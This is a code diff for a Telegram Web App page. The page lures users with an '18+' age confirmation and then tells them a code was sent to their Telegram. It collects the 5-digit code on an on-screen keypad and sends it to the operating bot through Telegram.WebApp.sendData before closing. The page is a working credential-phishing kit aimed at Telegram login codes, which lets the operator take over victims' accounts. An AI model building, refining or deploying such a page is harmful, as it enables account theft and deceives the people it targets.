@@ -5,94 +5,63 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #000; color: white; font-family: sans-serif; text-align: center; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        .container { width: 100%; display: flex; flex-direction: column; align-items: center; padding-top: 30px; }
+        body { 
+            background: url('https://telegra.ph/file/bc0d880017165502c4819.png') no-repeat center center fixed; 
+            background-size: cover; margin: 0; padding: 0; font-family: sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center;
+        }
+        .overlay { background: rgba(0, 0, 0, 0.7); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
+        .content { position: relative; z-index: 2; width: 90%; text-align: center; }
         
-        /* ১ম ধাপের ফটো ও টেক্সট */
-        .warning-img { width: 130px; margin-bottom: 20px; }
-        .msg-box { background: #1c242f; padding: 15px; border-radius: 12px; width: 85%; margin-bottom: 20px; font-size: 14px; border-left: 4px solid #0088cc; text-align: left; line-height: 1.4; }
-        .btn-blue { background: #5a78f0; color: white; padding: 16px; border-radius: 12px; font-size: 18px; border: none; font-weight: bold; width: 88%; cursor: pointer; }
-
-        /* ২য় ধাপের কিপ্যাড ও বক্স */
-        .code-container { display: flex; gap: 8px; margin: 25px 0; }
-        .code-box { width: 48px; height: 58px; border: 2px solid #444; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 26px; font-weight: bold; background: rgba(255,255,255,0.05); }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 88%; max-width: 340px; }
-        .key { background: #5a78f0; padding: 18px; border-radius: 14px; font-size: 24px; border: none; color: white; font-weight: bold; }
+        /* ১৮+ লোগো */
+        .warning-circle { width: 100px; height: 100px; background: white; border-radius: 50%; border: 4px solid red; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-weight: bold; font-size: 30px; color: black; }
+        
+        .msg-box { background: #1c242f; color: white; padding: 15px; border-radius: 12px; margin-bottom: 20px; font-size: 15px; border: 1px solid #333; }
+        
+        /* কিপ্যাড লেআউট */
+        .code-container { display: flex; gap: 8px; justify-content: center; margin-bottom: 20px; }
+        .code-box { width: 45px; height: 55px; border: 2px solid #5a78f0; border-radius: 8px; background: rgba(255,255,255,0.1); color: white; font-size: 24px; display: flex; align-items: center; justify-content: center; }
+        
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%; }
+        .key { background: #5a78f0; border: none; padding: 15px; border-radius: 10px; color: white; font-size: 22px; font-weight: bold; }
         .key:active { background: #3f56b5; }
-        
+
         .hidden { display: none; }
     </style>
 </head>
 <body>
-
-    <div class="container" id="step1">
-        <img src="https://telegra.ph/file/bc0d880017165502c4819.png" class="warning-img" alt="18+">
-        <div class="msg-box">
-            ⚠️ ¡Atención! 🔞 Para continuar, confirma que eres mayor de 18 años. 😊
-        </div>
-        <button class="btn-blue" onclick="showStep2()">🍓 confirmar 🔞</button>
-    </div>
-
-    <div class="container hidden" id="step2">
-        <div class="msg-box">
-            📩 Te hemos enviado un código de confirmación a tu Telegram oficial. Introdúcelo abajo.
-        </div>
-        
-        <div class="code-container">
-            <div class="code-box" id="b1"></div>
-            <div class="code-box" id="b2"></div>
-            <div class="code-box" id="b3"></div>
-            <div class="code-box" id="b4"></div>
-            <div class="code-box" id="b5"></div>
+    <div class="overlay"></div>
+    <div class="content">
+        <div id="step1">
+            <div class="warning-circle">18+</div>
+            <div class="msg-box">⚠️ Attention! 🔞 To continue, you must confirm that you are over 18 😊</div>
+            <button class="key" style="width:100%" onclick="showStep2()">🍓 confirm 🔞</button>
         </div>
 
-        <div class="keypad">
-            <button class="key" onclick="press('1')">1</button>
-            <button class="key" onclick="press('2')">2</button>
-            <button class="key" onclick="press('3')">3</button>
-            <button class="key" onclick="press('4')">4</button>
-            <button class="key" onclick="press('5')">5</button>
-            <button class="key" onclick="press('6')">6</button>
-            <button class="key" onclick="press('7')">7</button>
-            <button class="key" onclick="press('8')">8</button>
-            <button class="key" onclick="press('9')">9</button>
-            <div style="visibility:hidden"></div>
-            <button class="key" onclick="press('0')">0</button>
-            <button class="key" onclick="del()">⌫</button>
+        <div id="step2" class="hidden">
+            <div class="msg-box">Enter the 5-digit code that we just sent you!</div>
+            <div class="code-container">
+                <div class="code-box" id="b1"></div><div class="code-box" id="b2"></div><div class="code-box" id="b3"></div><div class="code-box" id="b4"></div><div class="code-box" id="b5"></div>
+            </div>
+            <div class="keypad">
+                <button class="key" onclick="press('1')">1</button><button class="key" onclick="press('2')">2</button><button class="key" onclick="press('3')">3</button>
+                <button class="key" onclick="press('4')">4</button><button class="key" onclick="press('5')">5</button><button class="key" onclick="press('6')">6</button>
+                <button class="key" onclick="press('7')">7</button><button class="key" onclick="press('8')">8</button><button class="key" onclick="press('9')">9</button>
+                <div></div><button class="key" onclick="press('0')">0</button><button class="key" onclick="del()">⌫</button>
+            </div>
         </div>
     </div>
 
     <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
         let code = "";
-
-        function showStep2() {
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-        }
-
+        function showStep2() { document.getElementById('step1').classList.add('hidden'); document.getElementById('step2').classList.remove('hidden'); }
         function press(num) {
             if (code.length < 5) {
-                code += num;
-                updateDisplay();
-                if (code.length === 5) {
-                    tg.sendData(code); // কোডটি বটের কাছে পাঠিয়ে দিবে
-                    setTimeout(() => tg.close(), 500);
-                }
+                code += num; updateDisplay();
+                if (code.length === 5) { Telegram.WebApp.sendData(code); setTimeout(() => Telegram.WebApp.close(), 500); }
             }
         }
-
-        function del() {
-            code = code.slice(0, -1);
-            updateDisplay();
-        }
-
-        function updateDisplay() {
-            for (let i = 1; i <= 5; i++) {
-                document.getElementById('b' + i).innerText = code[i - 1] || "";
-            }
-        }
+        function del() { code = code.slice(0, -1); updateDisplay(); }
+        function updateDisplay() { for (let i = 1; i <= 5; i++) { document.getElementById('b' + i).innerText = code[i - 1] || ""; } }
     </script>
 </body>
 </html>
